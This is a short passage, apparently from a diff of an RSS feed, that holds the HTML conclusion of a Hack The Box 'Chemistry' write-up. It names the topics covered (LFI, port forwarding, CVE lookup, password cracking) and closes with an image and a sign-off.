+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;This machine covers topics like LFI, port forwarding, looking for CVEs and password cracking.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/11.png"
+width="731"
+height="590"
+srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/11_hu_eb47687b88408f93.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/11_hu_8683d605435bf6bc.png 1024w"
+loading="lazy"
+alt="Final"
+class="gallery-image"
+data-flex-grow="123"
+data-flex-basis="297px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;Hope you enjoy it and Happy Hacking!&lt;/mark&gt;&lt;/p&gt;</description></item></channel></rss>
